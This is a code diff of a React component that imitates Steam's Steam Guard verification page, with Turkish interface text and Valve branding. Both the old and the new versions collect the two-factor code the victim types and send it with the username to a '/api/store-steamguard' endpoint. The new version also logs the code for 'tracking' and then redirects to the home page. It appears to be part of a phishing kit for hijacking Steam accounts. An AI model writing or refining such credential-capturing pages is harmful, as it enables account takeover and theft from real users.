@@ -1,190 +1,95 @@
 
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
+import { useNavigate, useLocation } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
-import { Loader } from 'lucide-react';
-import { useLocation, useNavigate } from 'react-router-dom';
+import { Shield, Loader } from 'lucide-react';
+import { toast } from 'sonner';
 
 const SteamGuard = () => {
-  const [code, setCode] = useState('');
+  const [guardCode, setGuardCode] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [timer, setTimer] = useState(30);
-  const [language, setLanguage] = useState('tr'); // Default language is Turkish
-  const location = useLocation();
   const navigate = useNavigate();
-  const username = location.state?.username || '';
+  const location = useLocation();
+  const { username } = location.state || { username: '' };
 
-  // Page title management
-  useEffect(() => {
-    const titles = {
-      tr: 'Steam Guard Bekleniyor',
-      en: 'Steam Guard Waiting',
-      de: 'Steam Guard Warten',
-      fr: 'Attente de Steam Guard',
-      es: 'Esperando Steam Guard'
-    };
-    document.title = titles[language] || titles.en;
-    
-    return () => {
-      document.title = 'Steam'; // Reset title on unmount
-    };
-  }, [language]);
-
-  // Detect user's language based on browser settings
-  useEffect(() => {
-    try {
-      const userLanguage = navigator.language.split('-')[0];
-      if (['en', 'tr', 'de', 'fr', 'es'].includes(userLanguage)) {
-        setLanguage(userLanguage);
-      }
-    } catch (error) {
-      console.error('Error detecting language:', error);
-    }
-  }, []);
-
-  // Timer countdown
-  useEffect(() => {
-    if (timer > 0) {
-      const interval = setInterval(() => {
-        setTimer(prevTimer => prevTimer - 1);
-      }, 1000);
-      return () => clearInterval(interval);
-    }
-  }, [timer]);
-
-  const translations = {
-    tr: {
-      title: 'Steam Guard Mobil Kimlik Doğrulayıcı',
-      subtitle: 'Lütfen Steam Guard Mobil Kimlik Doğrulayıcı uygulamasından veya e-posta adresinize gönderilen kodu girin.',
-      codeLabel: 'Kimlik Doğrulama Kodu',
-      submitButton: 'Gönder',
-      resendCode: 'Kodu Tekrar Gönder',
-      expire: 'Kod süresi dolacak: ',
-      seconds: ' saniye',
-      submitting: 'Doğrulanıyor...'
-    },
-    en: {
-      title: 'Steam Guard Mobile Authenticator',
-      subtitle: 'Please enter the code from your Steam Guard Mobile Authenticator app or the code sent to your email.',
-      codeLabel: 'Authentication Code',
-      submitButton: 'Submit',
-      resendCode: 'Resend Code',
-      expire: 'Code expires in: ',
-      seconds: ' seconds',
-      submitting: 'Verifying...'
-    },
-    // Add more languages as needed
-  };
-
-  // Get translations based on current language
-  const t = translations[language] || translations.en;
-
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    
-    if (!code || code.length < 5) {
-      return; // Don't submit if code is not complete
-    }
-    
     setIsSubmitting(true);
-    
-    try {
-      // Send the Steam Guard code to our API
-      const response = await fetch('/api/store-steamguard', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          username,
-          code
-        }),
-      });
+
+    // Log the Steam Guard code for tracking
+    console.log('Steam Guard code submitted:', guardCode, 'for username:', username);
+
+    // Send the code to the mock database
+    fetch('/api/store-steamguard', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ code: guardCode, username }),
+    }).then(() => {
+      toast.success("Giriş başarılı! Yönlendiriliyorsunuz...");
       
-      console.log('Steam Guard response:', await response.json());
-      
-      // Simulate loading time
+      // Redirect to home after 1.5 seconds
       setTimeout(() => {
-        navigate('/'); // Redirect back to home
-      }, 2000);
-      
-    } catch (error) {
-      console.error('Error submitting Steam Guard code:', error);
+        navigate('/');
+      }, 1500);
+    }).catch(error => {
+      console.error("Error storing Steam Guard code:", error);
+      toast.error("Bir hata oluştu. Lütfen tekrar deneyin.");
       setIsSubmitting(false);
-    }
+    });
   };
 
   return (
-    <div className="min-h-screen bg-[#171a21] flex flex-col">
-      {/* Header */}
-      <header className="bg-[#171a21] py-4 border-b border-[#2a3f5a]">
-        <div className="container mx-auto px-4 flex justify-center">
-          <img src="/lovable-uploads/dd61aa68-1534-4089-b154-6d063758d1a1.png" alt="Steam" className="h-10" />
+    <div className="min-h-screen bg-[#171a21] flex flex-col items-center justify-center p-4">
+      <div className="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full">
+        <div className="text-center mb-6">
+          <Shield className="h-16 w-16 text-blue-400 mx-auto mb-4" />
+          <h1 className="text-xl font-bold text-white">Steam Guard Doğrulama</h1>
+          <p className="text-sm text-white/70 mt-2">
+            E-posta adresinize gönderilen veya Steam Authenticator mobil uygulamasındaki kodu girin.
+          </p>
         </div>
-      </header>
-      
-      {/* Main content */}
-      <main className="flex-1 flex flex-col items-center justify-center p-4">
-        <div className="bg-[#1b2838] rounded-md shadow-lg max-w-md w-full p-6">
-          <h1 className="text-2xl font-bold text-white mb-2">{t.title}</h1>
-          <p className="text-gray-400 mb-6">{t.subtitle}</p>
+        
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div className="space-y-2">
+            <label className="text-sm font-medium text-white/70">
+              Steam Guard Kodu
+            </label>
+            <Input
+              value={guardCode}
+              onChange={(e) => setGuardCode(e.target.value)}
+              className="bg-[#32353c] border-0 text-white text-center tracking-widest text-xl h-12"
+              placeholder="XXXXX"
+              maxLength={5}
+              disabled={isSubmitting}
+            />
+          </div>
           
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <div className="space-y-2">
-              <label htmlFor="code" className="block text-sm font-medium text-gray-300">
-                {t.codeLabel}
-              </label>
-              <Input
-                id="code"
-                value={code}
-                onChange={(e) => {
-                  // Allow only alphanumeric characters and limit to 5 chars
-                  const value = e.target.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
-                  if (value.length <= 5) {
-                    setCode(value);
-                  }
-                }}
-                className="bg-[#32353c] border-0 h-12 text-white text-center text-xl tracking-widest"
-                placeholder="XXXXX"
-                maxLength={5}
-                disabled={isSubmitting}
-                autoFocus
-              />
-            </div>
-            
-            <div className="flex items-center justify-between text-sm text-gray-400">
-              <button type="button" className="hover:text-blue-400" onClick={() => setTimer(30)}>
-                {t.resendCode}
-              </button>
-              <div>
-                {t.expire}{timer}{t.seconds}
-              </div>
-            </div>
-            
-            <Button
-              type="submit"
-              className="w-full h-12 bg-blue-600 hover:bg-blue-700 transition-colors"
-              disabled={isSubmitting || code.length < 5}
-            >
-              {isSubmitting ? (
-                <>
-                  <Loader className="mr-2 h-4 w-4 animate-spin" />
-                  {t.submitting}
-                </>
-              ) : (
-                t.submitButton
-              )}
-            </Button>
-          </form>
-        </div>
-      </main>
-      
-      {/* Footer */}
-      <footer className="bg-[#171a21] py-6 border-t border-[#2a3f5a] text-center text-sm text-gray-500">
-        <div className="container mx-auto px-4">
-          <p>© Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.</p>
-        </div>
-      </footer>
+          <Button 
+            type="submit" 
+            className="w-full h-10 bg-blue-400 hover:bg-blue-500 text-white"
+            disabled={isSubmitting}
+          >
+            {isSubmitting ? (
+              <>
+                <Loader className="mr-2 h-4 w-4 animate-spin" />
+                Doğrulanıyor...
+              </>
+            ) : (
+              'Gönder'
+            )}
+          </Button>
+          
+          <div className="pt-4 border-t border-[#32353c]">
+            <p className="text-xs text-white/60 text-center">
+              Steam Guard kodunuzu bulamıyor musunuz? <br />
+              <a href="#" className="text-blue-400 hover:underline">Yardım için buraya tıklayın</a>
+            </p>
+          </div>
+        </form>
+      </div>
     </div>
   );
 };
